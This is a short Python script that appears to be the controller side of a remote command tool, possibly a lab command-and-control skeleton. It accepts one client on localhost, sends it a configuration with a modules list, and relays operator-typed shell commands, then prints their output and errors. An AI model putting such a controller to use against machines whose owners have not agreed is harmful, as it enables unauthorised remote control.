#!/usr/bin/python3
#coding: utf-8

import socket
import json

HOST = '127.0.0.1'
PORT = 8081


def get_client_configuration(id: str) -> dict:
    return {
        "id": id,
        "modules": []
    }


def send_message(socket: socket.socket, type: str, payload: dict):
    data = {
        "action": type,
        "payload": payload
    }

    message = json.dumps(data)
    print("Sending %s" % message)
    socket.send(message.encode())


def receive_message(socket: socket.socket) -> dict:
    message = socket.recv(4096)
    decoded_message = message.decode()
    print("Received %s" % decoded_message)
    return json.loads(decoded_message)


server = socket.socket()
server.bind((HOST, PORT))

print('[+] Server started')
print('[+] Listening for client connection ...')

server.listen(1)
client, client_addr = server.accept()

print(f'[+] {client_addr} Client connected to the server')

message = receive_message(client)
print('[+] Message received: "%s"' % message)
client_id = message["payload"]["id"]

print('[+] Sending config to "%s"' % client_id)

send_message(client, "SET_CONFIG", get_client_configuration(client_id))

while True:
    command = input("Enter command: ")
    send_message(client, "RUNCOMMAND", {"command": command})
    print('[+] Command sent')

    message = receive_message(client)
    print(f'Output:\n{message["payload"]["output"]}')
    print(f'Output error:\n{message["payload"]["output_error"]}')
